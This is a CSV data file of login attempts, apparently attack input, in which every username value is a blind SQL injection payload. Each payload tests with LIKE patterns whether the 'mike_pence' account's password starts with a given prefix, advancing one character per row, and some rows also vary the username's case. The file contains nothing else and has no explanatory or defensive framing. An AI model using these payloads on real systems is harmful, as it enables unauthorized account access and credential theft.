email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_em%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_en%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ep%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_er%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_es%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_et%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eu%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ev%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ew%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ex%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ey%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ez%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc;%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc:%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc!%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc?%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc.%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc@%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc&%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc#%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc`%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc<%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc>%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc|%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc~%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENc9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENca%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENce%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENch%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENci%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENck%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENco%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcr%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcs%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENct%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcu%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pENcz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mike%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'miki%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'miko%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikr%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'miks%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikt%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'miku%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'miky%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'ml%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mr%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'ms%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mt%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mu%')#,123123
